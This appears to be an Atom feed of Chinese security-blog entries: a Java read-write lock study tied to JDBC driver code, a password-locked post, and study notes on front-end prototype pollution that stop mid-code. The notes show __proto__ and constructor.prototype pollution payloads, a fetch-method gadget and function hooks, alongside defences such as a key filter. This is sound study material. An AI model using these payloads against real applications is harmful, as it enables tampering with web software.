    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>调试JDBC反序列化的时候，里面有这种操作，有点好奇就来看看<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ConnectionUrl <span class="title function_">getConnectionUrlInstance</span><span class="params">(String connString, Properties info)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (connString == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.0&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">connStringCacheKey</span> <span class="operator">=</span> buildConnectionStringCacheKey(connString, info);</span><br><span class="line">        ConnectionUrl connectionUrl;</span><br><span class="line"></span><br><span class="line">        rwLock.readLock().lock();</span><br><span class="line">        connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">        <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">            rwLock.readLock().unlock();</span><br><span class="line">            rwLock.writeLock().lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Check again, in the meantime it could have been cached by another thread.</span></span><br><span class="line">                connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">                <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">ConnectionUrlParser</span> <span class="variable">connStrParser</span> <span class="operator">=</span> ConnectionUrlParser.parseConnectionString(connString);</span><br><span class="line">                    connectionUrl = Type.getConnectionUrlInstance(connStrParser, info);</span><br><span class="line">                    connectionUrlCache.put(connStringCacheKey, connectionUrl);</span><br><span class="line">                &#125;</span><br><span class="line">                rwLock.readLock().lock();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                rwLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        rwLock.readLock().unlock();</span><br><span class="line">        <span class="keyword">return</span> connectionUrl;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.readLock().lock();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">            rwl.readLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.writeLock().lock();</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            rwl.writeLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainReadWritLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReadWriteLockTest</span> <span class="variable">rwlt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReadWriteLockTest</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.get();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.put();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read second value:0.0</span><br><span class="line">----Thread:Thread-1----read second value:0.0</span><br><span class="line">----Thread:Thread-0----read second value:0.0</span><br><span class="line">----Thread:Thread-2----read second value:0.0</span><br><span class="line">----Thread:Thread-3----read second value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.38882443875894124</span><br><span class="line">----Thread:Thread-6----write first value:0.537279172993168</span><br></pre></td></tr></table></figure><br>可以看到，在<code>read second value</code>这一段结束了，才开始write的操作，也就是说在没有释放<code>readlock</code>的时候,<code>writelock</code>是锁着的，也就是 <strong>读读不互斥，写写不互斥，读写有互斥</strong><br>如果把锁注释，也就是下面的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.7311360215541859</span><br><span class="line">----Thread:Thread-6----write first value:0.32755079667745735</span><br><span class="line">----Thread:Thread-0----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-1----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-3----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-2----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-4----read second value:0.32755079667745735</span><br></pre></td></tr></table></figure><br>可以看到write写到中间了</p><h1 id="getConnectionUrlInstance"><a href="#getConnectionUrlInstance" class="headerlink" title="getConnectionUrlInstance"></a>getConnectionUrlInstance</h1><p>回到开头的代码，可以发现这里是在读取缓存的时候加锁，读完了就释放，然后在加上写锁，往缓存列表放入URL</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;调试JDBC反序列化的时候，里面有这种操作，有点好奇就来看看&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="多线程" scheme="https://kaikaix.github.io/categories/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="java" scheme="https://kaikaix.github.io/tags/java/"/>
    
    <category term="thread" scheme="https://kaikaix.github.io/tags/thread/"/>
    
  </entry>
  
  <entry>
    <title>刷题2</title>
    <link href="https://kaikaix.github.io/2023/10/02/%E5%88%B7%E9%A2%982/"/>
    <id>https://kaikaix.github.io/2023/10/02/%E5%88%B7%E9%A2%982/</id>
    <published>2023-10-02T07:33:28.000Z</published>
    <updated>2023-10-17T09:25:24.541Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="c3da76820f00cc470e9404a57133e76fc5233b907e109ae865e1803f32f971d3"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全7-原型链污染（笔记）</title>
    <link href="https://kaikaix.github.io/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-02T05:24:12.000Z</published>
    <updated>2023-10-13T00:32:32.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10317892">https://ithelp.ithome.com.tw/articles/10317892</a></li></ul><blockquote><p>有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要<br><a href="https://ithelp.ithome.com.tw/articles/10317133">Universal XSS</a><br><a href="https://ithelp.ithome.com.tw/articles/10316778">Mutation XSS</a><br><span id="more"></span></p></blockquote><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>总感觉自己讲不清楚，还是去看别人写的吧<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><br>当用JSON.parse可以把<strong>proto</strong>当为纯键值。<br>调试分析了一下，发现在第二层的时候会判断<code>__proto__</code>是否在对象中，对于target来说是原型链存在，对于source来说是普通的键值，就是<code>&#123;&#39;b&#39;:2&#125;</code><br>当然也可以用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;constructor&quot;: &#123;&quot;prototype&quot;:&#123;&quot;b&quot;: 2&#125;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><br>在控制台输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">__proto__</span> == obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> </span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure></p><h2 id="constructor-和-prototype"><a href="#constructor-和-prototype" class="headerlink" title="constructor 和 prototype"></a>constructor 和 prototype</h2><p>这时候会引出一个问题，就是经常会看到，一会是<code>constructor.prototype</code>，一会又是<code>prototype.constructor</code>，这时候就很容易搞混<br>可以参考这篇文章，我感觉我自己都有点迷糊<br><a href="https://wangdoc.com/javascript/oop/prototype">https://wangdoc.com/javascript/oop/prototype</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;二毛&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span><span class="comment">//false</span></span><br></pre></td></tr></table></figure></p><p>同样是<code>constructor.prototype</code>，Animal是Function，cat1是Object<br><code>cat1.constructor</code>指向他的构造函数，也就是<code>Animal</code><br><code>Animal.constructor</code>也是指向他的构造函数，但是是<code>Function</code>，所以下面的就会是true<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p><p><code>__proto__</code>可以用来访问对象的原型，也就是<code>prototype</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat1.<span class="property">__proto__</span>.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">__proto__</span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure><br>原理这些还是自己去找资料吧，感觉我讲的也不清晰</p><h1 id="Prototype-pollution-script-gadgets"><a href="#Prototype-pollution-script-gadgets" class="headerlink" title="Prototype pollution script gadgets"></a>Prototype pollution script gadgets</h1><p><a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="过滤字符串过滤"><a href="#过滤字符串过滤" class="headerlink" title="过滤字符串过滤"></a>过滤字符串过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key === <span class="string">&quot;constructor&quot;</span> || key == <span class="string">&#x27;__proto__&#x27;</span> || key == <span class="string">&quot;prototype&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;No pollution&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建一个空对象"><a href="#创建一个空对象" class="headerlink" title="创建一个空对象"></a>创建一个空对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;a&#x27; of undefined</span></span><br></pre></td></tr></table></figure><h2 id="冻结prototype"><a href="#冻结prototype" class="headerlink" title="冻结prototype"></a>冻结prototype</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><p>不会报错，只是不能被修改，可能会增加debug的难度</p><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><p>通过<code>--disable-proto</code>关掉<code>prototype</code><br><a href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">官方文档</a></p><h1 id="隐形的前端gadget"><a href="#隐形的前端gadget" class="headerlink" title="隐形的前端gadget"></a>隐形的前端gadget</h1><p>可以通过更改前端的API的一些变量<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = <span class="string">&#x27;a=1&#x27;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>例如上面这种，就会把本来应该发送GET请求的代码，变成发送POST<br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p><p>有时候有些条件可以让你直接把<code>fetch</code>给覆盖了，这样他的代码都会走你的假<code>fetch</code>，这也是爬虫里面经常用到的技巧<br>例如下面的代码，参考 <a href="https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA">https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook JSON.stringify ——&gt; &quot;</span>, params);</span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">stringify</span>(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> open = <span class="variable language_">window</span>.<span 